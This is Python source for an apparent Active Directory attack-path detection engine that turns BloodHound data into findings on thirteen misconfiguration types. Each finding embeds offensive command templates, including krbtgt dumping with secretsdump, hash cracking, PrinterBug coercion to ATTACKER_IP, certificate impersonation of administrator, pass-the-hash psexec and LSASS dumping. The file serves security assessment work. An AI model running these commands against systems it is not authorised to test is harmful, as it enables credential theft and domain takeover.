"""
HorusEye — Attack Path Detection Engine

Consumes the normalized ``domain_data`` dict produced by ``parsers.all_parsers``
and emits a flat list of findings. The finding schema (keys, confidence levels,
evidence shape) is documented in ``core.finding``; ``attach_schema`` fills the
schema fields after detection.

Detections are assessment-grade: they report *where* a misconfiguration exists,
the evidence behind it, and the standard documented command to validate it.
``core.knowledge`` then attaches ATT&CK / remediation / detection guidance.
"""
from __future__ import annotations

import hashlib
from typing import Dict, List, Set

from horuseye.core.finding import attach_schema, ev
from horuseye.core.principals import PrincipalIndex, norm


# ── ACL right classes ──────────────────────────────────────────────────────
# RightName values as emitted by SharpHound / BloodHound CE (case-insensitive).
_DCSYNC_RIGHTS = {
    "dcsync",
    "getchanges",
    "getchangesall",
    "getchangesinfilteredset",
    "all",  # "All" extended right on the domain head implies replication
}

# Dangerous object-takeover ACEs → map right to a human label.
_ABUSE_RIGHTS = {
    "genericall":          "full control (GenericAll)",
    "genericwrite":        "property write (GenericWrite)",
    "writedacl":           "DACL rewrite (WriteDacl)",
    "writeowner":          "ownership takeover (WriteOwner)",
    "owns":                "ownership (Owns)",
    "forcechangepassword": "password reset (ForceChangePassword)",
    "addmember":           "group write (AddMember)",
    "addself":             "self-add to group (AddSelf)",
    "allextendedrights":   "all extended rights",
    "addkeycredentiallink": "shadow-credentials (AddKeyCredentialLink)",
    "writespn":            "targeted kerberoast (WriteSPN)",
    "writeaccountrestrictions": "account-restriction write",
}

# More targets than this for one (principal, right) pair are reported as a
# single aggregated finding instead of one finding per object. Evidence always
# retains every affected object regardless of this threshold.
ACL_AGGREGATE_THRESHOLD = 5
# A non-Tier-0 principal that is local admin on at least this many hosts.
BROAD_ADMIN_THRESHOLD = 3
# Cap on the number of evidence entries kept per aggregated finding.
EVIDENCE_CAP = 1000


class AttackDetector:
    """Detects AD attack paths from parsed domain data.

    Detection coverage (README types 1-13):
        1  Kerberoasting              8  Pass-the-Hash
        2  AS-REP Roasting            9  ADCS ESC1-ESC8
        3  DCSync                    10  Domain Trusts
        4  ACL Abuse                 11  Privileged Sessions
        5  GPO Abuse                 12  Weak Password Policy
        6  Unconstrained Delegation  13  Stale Admin Accounts
        7  Constrained Delegation
    """

    def __init__(self, domain_data: Dict):
        self.data = domain_data or {}
        self.domain = self.data.get("domain", "") or ""
        self.dc_ip = self.data.get("dc_ip") or self.data.get("dc") or ""
        self.idx = PrincipalIndex(self.data)
        self._privileged = self.idx.privileged

    # ── Public entry point ──────────────────────────────────────────────────
    def detect_all(self) -> List[Dict]:
        findings: List[Dict] = []
        for detector in (
            self._detect_kerberoasting,          # 1
            self._detect_asrep_roasting,          # 2
            self._detect_dcsync,                  # 3
            self._detect_acl_abuse,               # 4
            self._detect_gpo_abuse,               # 5
            self._detect_unconstrained_deleg,     # 6
            self._detect_constrained_deleg,       # 7
            self._detect_pass_the_hash,           # 8
            self._detect_adcs,                    # 9
            self._detect_domain_trusts,           # 10
            self._detect_privileged_sessions,     # 11
            self._detect_weak_password_policy,    # 12
            self._detect_stale_admins,            # 13
        ):
            try:
                findings.extend(detector() or [])
            except Exception:
                # A malformed source must never take down the whole run.
                continue
        for f in findings:
            f.setdefault("id", self._finding_id(f))
        attach_schema(findings)
        return findings

    @staticmethod
    def _finding_id(f: Dict) -> str:
        """Stable id from type + affected, so the same issue matches across runs."""
        key = f"{f.get('type', '')}|{f.get('affected', '')}".encode("utf-8")
        return hashlib.sha1(key).hexdigest()[:12]

    # ── Privilege model ──────────────────────────────────────────────────────
    def _is_privileged(self, name: str) -> bool:
        return self.idx.is_privileged(name)

    # ── 1. Kerberoasting ──────────────────────────────────────────────────────
    def _detect_kerberoasting(self) -> List[Dict]:
        out = []
        for spn in self.data.get("spns", []):
            user = spn.get("user", "") if isinstance(spn, dict) else str(spn)
            if not user:
                continue
            priv = self._is_privileged(user)
            spn_list = spn.get("spns", []) if isinstance(spn, dict) else []
            svc = ", ".join(spn_list)
            out.append({
                "type": "KERBEROASTING",
                "title": f"Kerberoastable account: {user}"
                         + (" [privileged]" if priv else ""),
                "affected": user,
                "severity": "CRITICAL" if priv else "HIGH",
                "description": (
                    "Service account exposes an SPN, so any authenticated user can "
                    "request a TGS and crack it offline. "
                    + ("This account is a member of a Tier-0 group — cracking it "
                       "is a direct path to Domain Admin." if priv else
                       "Prioritise if the cleartext grants onward access.")
                    + (f" SPNs: {svc}" if svc else "")
                ),
                "evidence": [ev("bloodhound", user, "hasSPN=true")]
                            + [ev("bloodhound", user, f"SPN: {s}") for s in spn_list],
                "commands": [
                    f"impacket-GetUserSPNs {self.domain}/USER:PASS "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -request -outputfile kerb.hash",
                    "hashcat -m 13100 kerb.hash wordlist.txt -r rules/best64.rule",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1558/003/",
                ],
            })
        return out

    # ── 2. AS-REP Roasting ──────────────────────────────────────────────────────
    def _detect_asrep_roasting(self) -> List[Dict]:
        out = []
        for user in self.data.get("asrep_users", []):
            if not user:
                continue
            priv = self._is_privileged(user)
            out.append({
                "type": "ASREP_ROASTING",
                "title": f"AS-REP roastable: {user}"
                         + (" [privileged]" if priv else ""),
                "affected": user,
                "severity": "CRITICAL" if priv else "HIGH",
                "description": (
                    "Account has DONT_REQUIRE_PREAUTH set, so its AS-REP can be "
                    "requested without credentials and cracked offline."
                    + (" Account is Tier-0 — a direct DA path." if priv else "")
                ),
                "evidence": [ev("bloodhound", user, "DONT_REQ_PREAUTH=true")],
                "commands": [
                    f"impacket-GetNPUsers {self.domain}/{user} -no-pass "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -format hashcat -outputfile asrep.hash",
                    "hashcat -m 18200 asrep.hash wordlist.txt -r rules/best64.rule",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1558/004/",
                ],
            })
        return out

    # ── 3. DCSync ──────────────────────────────────────────────────────────────
    def _detect_dcsync(self) -> List[Dict]:
        out = []
        # Group replication rights by principal so GetChanges + GetChangesAll
        # on the domain head collapse into a single DCSync finding.
        by_principal: Dict[str, Set[str]] = {}
        aces_by_principal: Dict[str, list] = {}
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right in _DCSYNC_RIGHTS:
                principal = ace.get("principal", "")
                by_principal.setdefault(principal, set()).add(right)
                aces_by_principal.setdefault(principal, []).append(
                    (right, ace.get("source_file", "")))

        for principal, rights in by_principal.items():
            if not principal:
                continue
            # Replicating secrets needs Get-Changes AND Get-Changes-All (or a
            # combined DCSync / All grant). Either right alone is not enough.
            capable = ("dcsync" in rights or "all" in rights
                       or {"getchanges", "getchangesall"} <= rights)
            if not capable:
                continue
            # Domain Controllers, Domain Admins etc. replicate by design.
            if (self.idx.is_expected_replicator(principal)
                    or self.idx.classify(principal) == "noise"):
                continue
            out.append({
                "type": "DCSYNC",
                "title": f"DCSync rights: {principal}",
                "affected": principal,
                "severity": "CRITICAL",
                "description": (
                    "Principal holds directory-replication rights "
                    f"({', '.join(sorted(rights))}) on the domain. It can replicate "
                    "secrets from the DC — including the krbtgt hash — without "
                    "running code on a Domain Controller."
                ),
                "evidence": [ev("acl", f"{principal} → {self.domain or 'domain'}", r, file=fn)
                             for r, fn in sorted(aces_by_principal.get(principal, []))],
                "commands": [
                    f"impacket-secretsdump {self.domain}/{self._short(principal)}@"
                    f"{self.dc_ip or 'DC_IP'} -just-dc",
                    f"impacket-secretsdump {self.domain}/{self._short(principal)}@"
                    f"{self.dc_ip or 'DC_IP'} -just-dc-user {self.domain.split('.')[0] or 'DOMAIN'}\\\\krbtgt",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1003/006/",
                ],
            })
        return out

    # ── 4. ACL Abuse ──────────────────────────────────────────────────────────
    def _detect_acl_abuse(self) -> List[Dict]:
        gpo_names = {(g.get("name", "") or "").upper() for g in self.data.get("gpos", [])}
        grouped: Dict = {}
        ace_file: Dict = {}
        seen = set()
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right not in _ABUSE_RIGHTS:
                continue
            principal = ace.get("principal", "")
            target = ace.get("target", "")
            if not principal or not target or norm(principal) == norm(target):
                continue
            if target.upper() in gpo_names:
                continue  # reported once, as GPO_ABUSE
            if self.idx.classify(principal) in ("noise", "tier0"):
                continue  # expected rights, not an escalation
            if (principal, right, target) in seen:
                continue  # inherited + explicit duplicates
            seen.add((principal, right, target))
            grouped.setdefault((principal, right), []).append(target)
            ace_file[(principal, right, target)] = ace.get("source_file", "")

        out = []
        ref = ["https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html"]
        for (principal, right), targets in grouped.items():
            label = _ABUSE_RIGHTS[right]
            rule_id = f"ACL_ABUSE.{right}"
            broad = ("Granted to a broad group, so every domain user inherits it. "
                     if self.idx.classify(principal) == "broad" else "")
            # Evidence always retains every affected object, even when the
            # presentation is aggregated.
            evidence = [ev("acl", f"{principal} → {t}", right,
                           file=ace_file.get((principal, right, t), ""))
                        for t in targets[:EVIDENCE_CAP]]
            if len(targets) > ACL_AGGREGATE_THRESHOLD:
                tier0 = [t for t in targets if self.idx.is_tier0_target(t)]
                sample = ", ".join((tier0 or targets)[:3])
                out.append({
                    "type": "ACL_ABUSE",
                    "rule_id": rule_id,
                    "title": f"{label.capitalize()}: {principal} → {len(targets)} objects",
                    "affected": f"{principal} → {len(targets)} objects",
                    "severity": "CRITICAL" if tier0 else "HIGH",
                    "confidence": "MEDIUM" if not tier0 else "HIGH",
                    "confidence_reason": ("aggregated broad grant; individual targets "
                                          "may include benign objects"),
                    "description": (
                        broad + f"{principal} has {label} over {len(targets)} objects "
                        f"(e.g. {sample})"
                        + (f", including {len(tier0)} Tier-0 object(s)." if tier0 else ".")
                        + " This pattern usually comes from an over-broad delegation "
                        "on an OU or container."
                    ),
                    "targets": targets[:100],
                    "evidence": evidence,
                    "commands": self._acl_commands(right, (tier0 or targets)[0]),
                    "references": ref,
                })
                continue
            for target in targets:
                tier0 = self.idx.is_tier0_target(target)
                out.append({
                    "type": "ACL_ABUSE",
                    "rule_id": rule_id,
                    "title": f"{label.capitalize()}: {principal} → {target}",
                    "affected": f"{principal} → {target}",
                    "severity": "CRITICAL" if tier0 else "HIGH",
                    "description": (
                        broad + f"{principal} has {label} over {target}. "
                        + ("The target is Tier-0 / the domain object, so this right "
                           "amounts to domain control." if tier0 else
                           "Abusable to pivot toward higher-value objects.")
                    ),
                    "evidence": [ev("acl", f"{principal} → {target}", right,
                                    file=ace_file.get((principal, right, target), ""))],
                    "commands": self._acl_commands(right, target),
                    "references": ref,
                })
        return out

    def _acl_commands(self, right: str, target: str) -> List[str]:
        tgt = self._short(target)
        if right in ("forcechangepassword",):
            return [f"net rpc password \"{tgt}\" -U {self.domain}/USER%PASS -S {self.dc_ip or 'DC_IP'}"]
        if right in ("addmember", "addself"):
            return [f"net rpc group addmem \"{tgt}\" USER -U {self.domain}/USER%PASS -S {self.dc_ip or 'DC_IP'}"]
        if right in ("addkeycredentiallink",):
            return [f"certipy shadow auto -u USER@{self.domain} -p PASS -account {tgt}"]
        if right in ("genericall", "genericwrite", "writedacl", "writeowner", "owns"):
            return [
                f"# take ownership / grant rights over {tgt}, then abuse (targeted kerberoast or shadow creds)",
                f"certipy shadow auto -u USER@{self.domain} -p PASS -account {tgt}",
            ]
        return [f"# abuse {right} over {tgt} per BloodHound edge guidance"]

    # ── 5. GPO Abuse ──────────────────────────────────────────────────────────
    def _detect_gpo_abuse(self) -> List[Dict]:
        out = []
        gpo_names = {(g.get("name", "") or "").upper() for g in self.data.get("gpos", [])}
        seen = set()
        for ace in self.data.get("acls", []):
            right = self._right(ace)
            if right not in ("genericall", "genericwrite", "writedacl", "writeowner", "owns"):
                continue
            target = ace.get("target", "")
            if (target or "").upper() not in gpo_names:
                continue
            principal = ace.get("principal", "")
            # Tier-0 principals editing GPOs is expected, not an escalation.
            if self.idx.classify(principal) in ("noise", "tier0"):
                continue
            if (principal, target) in seen:
                continue
            seen.add((principal, target))
            out.append({
                "type": "GPO_ABUSE",
                "rule_id": f"GPO_ABUSE.{right}",
                "title": f"Writable GPO: {principal} → {target}",
                "affected": f"{principal} → {target}",
                "severity": "HIGH",
                "description": (
                    f"{principal} can modify GPO '{target}'. Editing the GPO pushes "
                    "attacker-controlled policy (scheduled task, immediate task, "
                    "local-admin membership) to every linked computer or user."
                ),
                "evidence": [ev("acl", f"{principal} → {target}", right,
                                file=ace.get("source_file", ""))],
                "commands": [
                    f"# enumerate links, then abuse with pyGPOAbuse / SharpGPOAbuse",
                    f"pygpoabuse.py {self.domain}/USER:PASS -gpo-id '<GUID>' -command 'whoami'",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1484/001/",
                ],
            })
        return out

    # ── 6. Unconstrained Delegation ──────────────────────────────────────────
    def _detect_unconstrained_deleg(self) -> List[Dict]:
        out = []
        for coll, kind in (("computers", "computer"), ("users", "account")):
            for obj in self.data.get(coll, []):
                if not obj.get("unconstrained_delegation"):
                    continue
                name = obj.get("name", "")
                out.append({
                    "type": "UNCONSTRAINED_DELEGATION",
                    "title": f"Unconstrained delegation: {name}",
                    "affected": name,
                    "severity": "CRITICAL",
                    "description": (
                        f"{kind.capitalize()} '{name}' is trusted for unconstrained "
                        "delegation. Coerce a DC to authenticate to it (PrinterBug / "
                        "PetitPotam) and capture a reusable TGT — including a DC's. "
                        "Verify this host is not itself a Domain Controller (where "
                        "the flag is expected)."
                    ),
                    "evidence": [ev("bloodhound", name, "TRUSTED_FOR_DELEGATION=true")],
                    "commands": [
                        f"# capture tickets on {name}, then coerce a DC:",
                        "python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP",
                        "impacket-rubeus monitor  # or Rubeus.exe monitor on the host",
                    ],
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/",
                    ],
                })
        return out

    # ── 7. Constrained Delegation ──────────────────────────────────────────────
    def _detect_constrained_deleg(self) -> List[Dict]:
        out = []
        targets_by: Dict[str, List[str]] = {}
        for d in self.data.get("delegation_targets", []) or []:
            targets_by.setdefault(d.get("principal", ""), []).append(d.get("target", ""))
        for coll, kind in (("computers", "computer"), ("users", "account")):
            for obj in self.data.get(coll, []):
                if not obj.get("trustedtoauth"):
                    continue
                name = obj.get("name", "")
                targets = sorted(t for t in targets_by.get(name, []) if t)
                out.append({
                    "type": "CONSTRAINED_DELEGATION",
                    "title": f"Constrained delegation (protocol transition): {name}",
                    "affected": name,
                    "severity": "HIGH",
                    "description": (
                        f"'{name}' is configured for constrained delegation with "
                        "protocol transition (TrustedToAuthForDelegation). If you "
                        "control it, you can impersonate any user to its allowed "
                        "services via S4U2Self + S4U2Proxy."
                        + (f" Allowed delegation targets: {', '.join(targets[:10])}"
                           + (f" (+{len(targets) - 10} more)." if len(targets) > 10 else ".")
                           if targets else "")
                    ),
                    "targets": targets,
                    "evidence": [ev("bloodhound", name, "TRUSTED_TO_AUTH_FOR_DELEGATION=true")]
                                + [ev("bloodhound", name, f"AllowedToDelegateTo: {t}") for t in targets],
                    "commands": [
                        f"impacket-getST -spn SERVICE/TARGET -impersonate Administrator "
                        f"{self.domain}/{self._short(name)}:PASS -dc-ip {self.dc_ip or 'DC_IP'}",
                    ],
                    "references": [
                        "https://attack.mitre.org/techniques/T1558/003/",
                    ],
                })
        return out

    # ── 8. Pass-the-Hash (reusable admin access) ──────────────────────────────
    def _detect_pass_the_hash(self) -> List[Dict]:
        out = []
        admin_hosts = []
        for src in ("cme_data", "nxc_data"):
            admin_hosts.extend(self.data.get(src, {}).get("admin_hosts", []) or [])
        if len(admin_hosts) >= 2:
            host_names = sorted({h.get("ip", h.get("hostname", "")) for h in admin_hosts})
            hosts = ", ".join(host_names)
            users = sorted({h.get("username", "") for h in admin_hosts if h.get("username")})
            out.append({
                "type": "PASS_THE_HASH",
                "rule_id": "PASS_THE_HASH.reusable_admin",
                "title": f"Reusable admin access across {len(admin_hosts)} hosts",
                "affected": ", ".join(users) or "local admin",
                "severity": "HIGH",
                "description": (
                    "The same credential grants administrative access to multiple "
                    f"hosts ({hosts}). A single dumped NTLM hash can be sprayed to all "
                    "of them, and shared local-admin secrets enable lateral movement "
                    "without ever cracking a password."
                ),
                "evidence": [ev("nxc/cme", h, "admin access (Pwn3d!)") for h in host_names],
                "commands": [
                    "nxc smb TARGETS -u Administrator -H <NTLM_HASH>",
                    "impacket-psexec -hashes :<NTLM_HASH> DOMAIN/Administrator@TARGET",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1550/002/",
                ],
            })

        # Over-broad local admin rights from BloodHound (a classic AD hygiene
        # finding: one non-Tier-0 group administering a whole fleet).
        hosts_by_principal: Dict[str, Set[str]] = {}
        for la in self.data.get("local_admins", []) or []:
            p, host = la.get("principal", ""), la.get("computer", "")
            if p and host and self.idx.classify(p) not in ("noise", "tier0"):
                hosts_by_principal.setdefault(p, set()).add(host)
        for principal, hosts in sorted(hosts_by_principal.items()):
            if len(hosts) < BROAD_ADMIN_THRESHOLD:
                continue
            broad = self.idx.classify(principal) == "broad"
            host_list = sorted(hosts)
            sample = ", ".join(host_list[:5])
            out.append({
                "type": "PASS_THE_HASH",
                "rule_id": "PASS_THE_HASH.broad_local_admin",
                "title": f"Broad local admin: {principal} on {len(hosts)} hosts",
                "affected": principal,
                "severity": "HIGH",
                "confidence": "HIGH",
                "confidence_reason": "AdminTo edges read directly from BloodHound",
                "description": (
                    ("This is a broad group, so every domain user is local admin on "
                     "these hosts. " if broad else "")
                    + f"{principal} is a local administrator on {len(hosts)} hosts "
                    f"(e.g. {sample}). Admin rights this wide let one compromised "
                    "account reach credentials cached across the whole fleet."
                ),
                "targets": host_list[:100],
                "evidence": [ev("bloodhound", f"{principal} → {h}", "AdminTo")
                             for h in host_list[:EVIDENCE_CAP]],
                "commands": [
                    "# confirm on a sample host (defender check):",
                    "Get-LocalGroupMember -Group Administrators",
                ],
                "references": [
                    "https://learn.microsoft.com/windows-server/identity/laps/laps-overview",
                ],
            })
        return out

    # ── 9. ADCS ESC1-ESC8 ──────────────────────────────────────────────────────
    def _detect_adcs(self) -> List[Dict]:
        out = []
        adcs = self.data.get("adcs", {}) or {}
        for vuln in adcs.get("vulnerabilities", []) or []:
            esc = (vuln.get("esc", "") or "").upper()
            # Template findings name the template; CA findings (ESC6/7/8/11) the CA.
            template = vuln.get("template", "") or vuln.get("ca", "")
            sev = vuln.get("severity") or ("CRITICAL" if esc in
                   ("ESC1", "ESC3", "ESC4", "ESC6", "ESC8") else "HIGH")
            out.append({
                "type": "ADCS_ESC",
                "rule_id": f"ADCS_ESC.{esc}" if esc else "ADCS_ESC",
                "title": f"ADCS {esc}: {template}" if template else f"ADCS {esc}",
                "affected": template or esc,
                "severity": sev,
                "description": vuln.get("description")
                    or f"Certificate template vulnerable to {esc}. Abusable to obtain "
                       "a certificate that authenticates as a privileged principal.",
                "evidence": [ev("certipy", template or esc, esc or "ADCS vulnerability")],
                "commands": self._adcs_commands(esc, template),
                "references": [
                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
                ],
            })
        return out

    def _adcs_commands(self, esc: str, template: str) -> List[str]:
        tpl = template or "TEMPLATE"
        if esc in ("ESC1", "ESC2", "ESC3"):
            return [
                f"certipy req -u USER@{self.domain} -p PASS -ca CA -template {tpl} "
                f"-upn administrator@{self.domain}",
                "certipy auth -pfx administrator.pfx -dc-ip " + (self.dc_ip or "DC_IP"),
            ]
        if esc == "ESC8":
            return ["certipy relay -ca CA_HOST  # then coerce a DC via PetitPotam"]
        return [f"certipy find -u USER@{self.domain} -p PASS -vulnerable  # confirm {esc}"]

    # ── 10. Domain Trusts ──────────────────────────────────────────────────────
    def _detect_domain_trusts(self) -> List[Dict]:
        out = []
        for t in self.data.get("trusts", []):
            target = t.get("target_domain", "")
            if not target:
                continue
            direction = (t.get("direction", "") or "").lower()
            ttype = (t.get("type", "") or "").lower()
            transitive = t.get("transitive", False)
            bidir = "bidir" in direction or direction in ("3", "bidirectional")
            external = "external" in ttype or "forest" in ttype
            sev = "HIGH" if (bidir and external) else "MEDIUM"
            out.append({
                "type": "DOMAIN_TRUST",
                "title": f"Domain trust: {self.domain} ↔ {target}",
                "affected": target,
                "severity": sev,
                "description": (
                    f"Trust to '{target}' (direction={t.get('direction','?')}, "
                    f"type={t.get('type','?')}, transitive={transitive}). "
                    + ("Bidirectional forest trust — SID history / cross-forest "
                       "Kerberoasting may extend compromise across the boundary."
                       if (bidir and external) else
                       "Review for cross-domain escalation paths.")
                ),
                "evidence": [ev("bloodhound", target,
                                f"direction={t.get('direction','?')}, type={t.get('type','?')}, "
                                f"transitive={transitive}")],
                "commands": [
                    f"impacket-GetUserSPNs -target-domain {target} {self.domain}/USER:PASS "
                    f"-dc-ip {self.dc_ip or 'DC_IP'} -request",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1482/",
                ],
            })
        return out

    # ── 11. Privileged Sessions ──────────────────────────────────────────────
    def _detect_privileged_sessions(self) -> List[Dict]:
        out = []
        admins_by_host: Dict[str, List[str]] = {}
        for la in self.data.get("local_admins", []) or []:
            p = la.get("principal", "")
            if p and self.idx.classify(p) not in ("noise", "tier0"):
                admins_by_host.setdefault(la.get("computer", ""), []).append(p)
        for s in self.data.get("sessions", []):
            user = s.get("UserName", "") or s.get("user", "")
            host = s.get("ComputerName", "") or s.get("ip", "")
            if not user or not self._is_privileged(user):
                continue
            exposed = sorted(set(admins_by_host.get(host, [])))
            out.append({
                "type": "PRIVILEGED_SESSION",
                "title": f"Privileged session: {user} on {host}",
                "affected": f"{user}@{host}",
                "severity": "HIGH",
                "description": (
                    f"Tier-0 principal {user} has a session on {host}. Local admin on "
                    f"{host} means that credential can be dumped from memory and reused."
                    + (f" Non-Tier-0 principals with local admin there: "
                       f"{', '.join(exposed[:10])}." if exposed else "")
                ),
                "evidence": [ev("bloodhound", f"{user}@{host}", "HasSession")]
                            + [ev("bloodhound", f"{p} → {host}", "AdminTo") for p in exposed],
                "commands": [
                    f"# with local admin on {host}, dump LSASS and extract {user}'s secret",
                    f"nxc smb {host} -u USER -p PASS --lsa",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1003/001/",
                ],
            })
        return out

    # ── 12. Weak Password Policy ──────────────────────────────────────────────
    def _detect_weak_password_policy(self) -> List[Dict]:
        pol = self.data.get("password_policy", {}) or {}
        if not pol:
            return []
        issues = []
        evidence = []
        min_len = self._to_int(pol.get("min_length"))
        if min_len is not None and min_len < 8:
            issues.append(f"minimum length is {min_len} (recommend ≥ 14)")
            evidence.append(ev("policy", "min_length", str(min_len)))
        lockout = self._to_int(pol.get("lockout_threshold"))
        if lockout is not None and lockout == 0:
            issues.append("account lockout is disabled (unlimited guessing)")
            evidence.append(ev("policy", "lockout_threshold", "0"))
        complexity = str(pol.get("complexity", "")).lower()
        if complexity in ("0", "false", "disabled", "off"):
            issues.append("complexity requirement is disabled")
            evidence.append(ev("policy", "complexity", complexity))
        if not issues:
            return []
        return [{
            "type": "WEAK_PASSWORD_POLICY",
            "title": "Weak domain password policy",
            "affected": self.domain or "domain",
            "severity": "MEDIUM",
            "description": "Domain password policy weaknesses: " + "; ".join(issues)
                + ". These materially raise the success rate of password spraying.",
            "evidence": evidence,
            "commands": [
                f"nxc smb {self.dc_ip or 'DC_IP'} -u USER -p PASS --pass-pol",
            ],
            "references": [
                "https://attack.mitre.org/techniques/T1110/003/",
            ],
        }]

    # ── 13. Stale Admin Accounts ──────────────────────────────────────────────
    def _detect_stale_admins(self) -> List[Dict]:
        out = []
        for u in self.data.get("users", []):
            if not u.get("admincount"):
                continue
            name = u.get("name", "")
            reasons = []
            evidence = [ev("bloodhound", name, "adminCount=1")]
            if not u.get("enabled", True):
                reasons.append("disabled but still admin-flagged (adminCount=1)")
                evidence.append(ev("bloodhound", name, "enabled=false"))
            if u.get("pwdneverexpires"):
                reasons.append("password never expires")
                evidence.append(ev("bloodhound", name, "pwdNeverExpires=true"))
            if not reasons:
                continue
            out.append({
                "type": "STALE_ADMIN",
                "title": f"Stale privileged account: {name}",
                "affected": name,
                "severity": "LOW" if "disabled" in reasons[0] else "MEDIUM",
                "description": (
                    f"Privileged account '{name}': " + "; ".join(reasons) + ". "
                    "Lingering Tier-0 accounts widen the attack surface and are prime "
                    "spraying / re-enable targets."
                ),
                "evidence": evidence,
                "commands": [
                    f"# review necessity; if unused, disable and strip group membership",
                ],
                "references": [
                    "https://attack.mitre.org/techniques/T1078/002/",
                ],
            })
        return out

    # ── Helpers ────────────────────────────────────────────────────────────────
    @staticmethod
    def _right(ace: Dict) -> str:
        """Lower-cased ACL RightName for class matching. Safe on malformed rows."""
        if not isinstance(ace, dict):
            return ""
        return (ace.get("right", "") or "").strip().lower()

    @staticmethod
    def _norm(name: str) -> str:
        """Upper-case, strip domain suffix for comparison (USER@CORP → USER)."""
        n = (name or "").strip().upper()
        return n.split("@")[0] if "@" in n else n

    @staticmethod
    def _short(name: str) -> str:
        """SAM-style short name for command templates."""
        n = (name or "").strip()
        return n.split("@")[0] if "@" in n else n

    def _is_domain_object(self, target: str) -> bool:
        t = (target or "").upper()
        return bool(self.domain) and t == self.domain.upper()

    @staticmethod
    def _to_int(value):
        try:
            return int(str(value).strip())
        except (TypeError, ValueError):
            return None
